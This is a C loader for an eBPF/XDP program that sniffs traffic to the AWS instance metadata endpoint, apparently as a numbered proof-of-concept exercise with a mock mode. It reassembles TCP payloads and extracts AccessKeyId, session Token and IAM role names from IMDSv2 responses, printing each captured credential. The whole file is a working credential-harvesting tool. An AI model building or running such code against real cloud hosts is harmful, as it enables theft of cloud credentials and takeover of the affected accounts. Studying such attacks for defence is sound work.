// ch25-imds-harvest loader.
//
// Attaches an XDP program to an interface (falls back across generic,
// drv, skb modes), drains a ringbuf of captured TCP payloads, reassembles
// per-connection bytes in userspace, and extracts AWS SigV4 credential
// triples from IMDSv2 response JSON.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <net/if.h>
#include <linux/if_link.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch25-imds-harvest.skel.h"

static volatile int running = 1;
static void on_sig(int s) { (void)s; running = 0; }

#define MAX_CONN    64
#define REASM_SIZE  8192

struct conn_key {
    unsigned int saddr, daddr;
    unsigned short sport, dport;
};

struct conn_state {
    struct conn_key k;
    unsigned int active;
    unsigned int len;
    char buf[REASM_SIZE];
};

static struct conn_state conns[MAX_CONN];

struct evt {
    unsigned int saddr, daddr;
    unsigned short sport, dport;
    unsigned short payload_len;
    unsigned char direction;
    unsigned char _pad;
    unsigned char payload[512];
};

static unsigned long long g_access_captures = 0;
static unsigned long long g_token_captures  = 0;
static char g_last_role[128] = {0};

static struct conn_state *conn_for(const struct conn_key *k)
{
    int free_idx = -1;
    for (int i = 0; i < MAX_CONN; i++) {
        if (conns[i].active &&
            conns[i].k.saddr == k->saddr && conns[i].k.daddr == k->daddr &&
            conns[i].k.sport == k->sport && conns[i].k.dport == k->dport)
            return &conns[i];
        if (!conns[i].active && free_idx < 0) free_idx = i;
    }
    if (free_idx < 0) free_idx = 0;
    memset(&conns[free_idx], 0, sizeof(conns[free_idx]));
    conns[free_idx].active = 1;
    conns[free_idx].k = *k;
    return &conns[free_idx];
}

static const char *find_json_str(const char *buf, unsigned int len,
                                 const char *key, unsigned int *out_len)
{
    size_t klen = strlen(key);
    if (len < klen + 4) return NULL;
    for (unsigned int i = 0; i + klen + 4 < len; i++) {
        if (buf[i] != '"') continue;
        if (memcmp(buf + i + 1, key, klen) != 0) continue;
        if (buf[i + 1 + klen] != '"') continue;
        unsigned int j = i + 2 + klen;
        while (j < len && (buf[j] == ' ' || buf[j] == ':' || buf[j] == '\t')) j++;
        if (j >= len || buf[j] != '"') continue;
        unsigned int start = j + 1;
        unsigned int end = start;
        while (end < len && buf[end] != '"') end++;
        if (end >= len) return NULL;
        *out_len = end - start;
        return buf + start;
    }
    return NULL;
}

static void scan_reassembled(struct conn_state *c)
{
    unsigned int vlen = 0;
    const char *v = find_json_str(c->buf, c->len, "AccessKeyId", &vlen);
    if (v && vlen >= 16 && vlen <= 32) {
        char akid[33] = {0};
        memcpy(akid, v, vlen);

        unsigned int tlen = 0;
        (void)find_json_str(c->buf, c->len, "Token", &tlen);

        printf("[ch25] CREDENTIALS_CAPTURED access_key=%s token_len=%u role=%s\n",
               akid, tlen, g_last_role[0] ? g_last_role : "unknown");
        fflush(stdout);
        g_access_captures++;
        if (tlen > 0) g_token_captures++;
        /* Drop the connection after capture so repeated refreshes
         * each get counted freshly. */
        c->active = 0;
    }
}

static void scrape_role(struct conn_state *c)
{
    static const char needle[] = "iam/security-credentials/";
    size_t nlen = sizeof(needle) - 1;
    if (c->len < nlen + 2) return;
    for (unsigned int i = 0; i + nlen < c->len; i++) {
        if (memcmp(c->buf + i, needle, nlen) != 0) continue;
        unsigned int start = i + nlen;
        unsigned int end = start;
        while (end < c->len && c->buf[end] != ' ' && c->buf[end] != '\r'
               && c->buf[end] != '/' && c->buf[end] != '?' && c->buf[end] != '\n')
            end++;
        unsigned int rl = end - start;
        if (rl > 0 && rl < sizeof(g_last_role) - 1) {
            memcpy(g_last_role, c->buf + start, rl);
            g_last_role[rl] = '\0';
        }
        return;
    }
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx; (void)sz;
    const struct evt *e = data;

    struct conn_key k = { e->saddr, e->daddr, e->sport, e->dport };
    struct conn_state *c = conn_for(&k);

    unsigned int room = REASM_SIZE - c->len;
    unsigned int n = e->payload_len < room ? e->payload_len : room;
    memcpy(c->buf + c->len, e->payload, n);
    c->len += n;

    scrape_role(c);
    scan_reassembled(c);

    return 0;
}

int main(int argc, char **argv)
{
    const char *ifname = "eth0";
    int mock_mode = 0;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-i") && i + 1 < argc) ifname = argv[++i];
        else if (!strcmp(argv[i], "--mock")) mock_mode = 1;
    }

    unsigned int ifindex = if_nametoindex(ifname);
    if (ifindex == 0) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"interface %s not found\"\n",
                ifname);
        return 2;
    }

    struct sigaction sa = { .sa_handler = on_sig };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    struct ch25_imds_harvest_bpf *s = ch25_imds_harvest_bpf__open_and_load();
    if (!s) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"skeleton load failed: %s\"\n",
                strerror(errno));
        return 2;
    }

    unsigned int zero = 0;
    unsigned int mode = mock_mode ? 1u : 0u;
    int cfg_fd = bpf_map__fd(s->maps.cfg);
    if (bpf_map_update_elem(cfg_fd, &zero, &mode, BPF_ANY) < 0) {
        fprintf(stderr, "[ch25] cfg map update: %s\n", strerror(errno));
    }

    int prog_fd = bpf_program__fd(s->progs.xdp_imds_capture);
    int attached = 0;
    unsigned int flags_try[] = { 0, XDP_FLAGS_DRV_MODE, XDP_FLAGS_SKB_MODE };
    for (unsigned i = 0; i < sizeof(flags_try)/sizeof(*flags_try); i++) {
        int err = bpf_xdp_attach(ifindex, prog_fd, flags_try[i], NULL);
        if (err == 0) { attached = 1; break; }
    }
    if (!attached) {
        fprintf(stderr, "[ch25] CH25_SKIP reason=\"xdp attach failed on %s\"\n",
                ifname);
        ch25_imds_harvest_bpf__destroy(s);
        return 2;
    }

    struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(s->maps.events),
                                              handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch25] ring_buffer__new: %s\n", strerror(errno));
        bpf_xdp_detach(ifindex, 0, NULL);
        ch25_imds_harvest_bpf__destroy(s);
        return 2;
    }

    fprintf(stderr, "[ch25] attached — xdp on %s (%s mode)\n",
            ifname, mock_mode ? "mock-127.0.0.1" : "imds-169.254.169.254");
    fflush(stderr);

    while (running) {
        int n = ring_buffer__poll(rb, 500);
        if (n == -EINTR) continue;
        if (n < 0) break;
    }

    printf("[ch25] CH25_PROVEN access_key_captures=%llu token_captures=%llu role=%s\n",
           g_access_captures, g_token_captures,
           g_last_role[0] ? g_last_role : "none");
    fflush(stdout);

    ring_buffer__free(rb);
    bpf_xdp_detach(ifindex, 0, NULL);
    ch25_imds_harvest_bpf__destroy(s);
    return 0;
}
